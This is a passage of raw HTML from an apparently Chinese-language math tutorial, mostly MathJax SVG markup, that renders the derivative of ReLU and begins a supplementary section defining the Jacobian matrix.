viewbox=\"0 -1449.5 12260.1 2399\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mi\" transform=\"translate(506,676)\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(520,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g><rect width=\"1292\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mtext\" transform=\"translate(1532,0)\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(736,0)\"/><path data-c=\"4C\" d=\"M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z\" transform=\"translate(1180,0)\"/><path data-c=\"55\" d=\"M128 622Q121 629 117 631T101 634T58 637H25V683H36Q57 680 180 680Q315 680 324 683H335V637H302Q262 636 251 634T233 622L232 418V291Q232 189 240 145T280 67Q325 24 389 24Q454 24 506 64T571 183Q575 206 575 410V598Q569 608 565 613T541 627T489 637H472V683H481Q496 680 598 680T715 683H724V637H707Q634 633 622 598L621 399Q620 194 617 180Q617 179 615 171Q595 83 531 31T389 -22Q304 -22 226 33T130 192Q129 201 128 412V622Z\" transform=\"translate(1805,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(4087,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4476,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5048,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5714.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mrow\" transform=\"translate(6770.6,0)\"><g data-mml-node=\"mo\" transform=\"translate(0 -0.5)\"><path data-c=\"7B\" d=\"M618 -943L612 -949H582L568 -943Q472 -903 411 -841T332 -703Q327 -682 327 -653T325 -350Q324 -28 323 -18Q317 24 301 61T264 124T221 171T179 205T147 225T132 234Q130 238 130 250Q130 255 130 258T131 264T132 267T134 269T139 272T144 275Q207 308 256 367Q310 436 323 519Q324 529 325 851Q326 1124 326 1154T332 1205Q369 1358 566 1443L582 1450H612L618 1444V1429Q618 1413 616 1411L608 1406Q599 1402 585 1393T552 1372T515 1343T479 1305T449 1257T429 1200Q425 1180 425 1152T423 851Q422 579 422 549T416 498Q407 459 388 424T346 364T297 318T250 284T214 264T197 254L188 251L205 242Q290 200 345 138T416 3Q421 -18 421 -48T423 -349Q423 -397 423 -472Q424 -677 428 -694Q429 -697 429 -699Q434 -722 443 -743T465 -782T491 -816T519 -845T548 -868T574 -886T595 -899T610 -908L616 -910Q618 -912 618 -928V-943Z\"/></g><g data-mml-node=\"mtable\" transform=\"translate(750,0)\"><g data-mml-node=\"mtr\" transform=\"translate(0,600)\"><g data-mml-node=\"mtd\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(1500,0)\"><g data-mml-node=\"mtext\"><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\"/><path data-c=\"66\" d=\"M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z\" transform=\"translate(278,0)\"/><path data-c=\"A0\" d=\"\" transform=\"translate(584,0)\"/></g><g data-mml-node=\"mi\" transform=\"translate(834,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1683.8,0)\"><path data-c=\"3E\" d=\"M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(2739.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-600)\"><g data-mml-node=\"mtd\"><g data-mml-node=\"mn\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(1500,0)\"><g data-mml-node=\"mtext\"><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\"/><path data-c=\"66\" d=\"M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z\" transform=\"translate(278,0)\"/><path data-c=\"A0\" d=\"\" transform=\"translate(584,0)\"/></g><g data-mml-node=\"mi\" transform=\"translate(834,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1683.8,0)\"><path data-c=\"2264\" d=\"M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(2739.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g></g></g></g><g data-mml-node=\"mo\" transform=\"translate(5489.6,0) translate(0 250)\"/></g></g></g></svg></mjx-container></span></p>\n<h1 id=\"数学补充\">数学补充</h1>\n<h2 id=\"雅可比矩阵jacobian\">1 雅可比矩阵（Jacobian）</h2>\n<p>雅可比矩阵是一个函数的一节偏导数矩阵。</p>\n<p>设： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"24.949ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 11027.4 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D432\" d=\"M84 -102Q84 -110 87 -119T102 -138T133 -149Q148 -148 162 -143T186 -131T206 -114T222 -95T234 -76T243 -59T249 -45T252 -37L269 0L96 382H26V444H34Q49 441 146 441Q252 441 270 444H279V382H255Q232 382 232 380L337 151L442 382H394V444H401Q413 441 495 441Q568 441 574 444H580V382H510L406 152Q298 -84 297 -87Q269 -139 225 -169T131 -200Q85 -200 54 -172T23 -100Q23 -64 44 -50T87 -35Q111 -35 130 -50T152 -92V-100H84V-102Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(884.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1940.6,0)\"><path data-c=\"1D453\" d=\"M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2490.6,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(2879.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D431\" d=\"M227 0Q212 3 121 3Q40 3 28 0H21V62H117L245 213L109 382H26V444H34Q49 441 143 441Q247 441 265 444H274V382H246L281 339Q315 297 316 297Q320 297 354 341L389 382H352V444H360Q375 441 466 441Q547 441 559 444H566V382H471L355 246L504 63L545 62H586V0H578Q563 3 469 3Q365 3 347 0H338V62H366Q366 63 326 112T285 163L198 63L217 62H235V0H227Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3486.6,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4153.3,0)\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(5098.1,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"211D\" d=\"M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(755,413) scale(0.707)\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(6524,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mstyle\" transform=\"translate(6802,0)\"><g data-mml-node=\"mspace\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(7968.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D431\" d=\"M227 0Q212 3 121 3Q40 3 28 0H21V62H117L245 213L109 382H26V444H34Q49 441 143 441Q247 441 265 444H274V382H246L281 339Q315 297 316 297Q320 297 354 341L389 382H352V444H360Q375 441 466 441Q547 441 559 444H566V382H471L355 246L504 63L545 62H586V0H578Q563 3 469 3Q365 3 347 0H338V62H366Q366 63 326 112T285 163L198 63L217 62H235V0H227Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(8853.4,0)\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(9798.2,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"211D\" d=\"M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(755,413) scale(0.707)\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<blockquote>\n<p>这里的 x 和 y 都是向量，即(1, n) 或 (n,1)的形状</p>\n</blockquote>\n<p>那么 <strong>雅可比矩阵</strong> 是： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -5.617ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"37.377ex\" height=\"12.365ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -2982.7 16520.7 5465.4\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43D\" d=\"M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(910.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(1966.6,0)\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D432\" d=\"M84 -102Q84 -110 87 -119T102 -138T133 -149Q148 -148 162 -143T186 -131T206 -114T222 -95T234 -76T243 -59T249 -45T252 -37L269 0L96 382H26V444H34Q49 441 146 441Q252 441 270 444H279V382H255Q232 382 232 380L337 151L442 382H394V444H401Q413 441 495 441Q568 441 574 444H580V382H510L406 152Q298 -84 297 -87Q269 -139 225 -169T131 -200Q85 -200 54 -172T23 -100Q23 -64 44 -50T87 -35Q111 -35 130 -50T152 -92V-100H84V-102Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D431\" d=\"M227 0Q212 3 121 3Q40 3 28 0H21V62H117L245 213L109 382H26V444H34Q49 441 143 441Q247 441 265 444H274V382H246L281 339Q315 297 316 297Q320 297 354 341L389 382H352V444H360Q375 441 466 441Q547 441 559 444H566V382H471L355 246L504 63L545 62H586V0H578Q563 3 469 3Q365 3 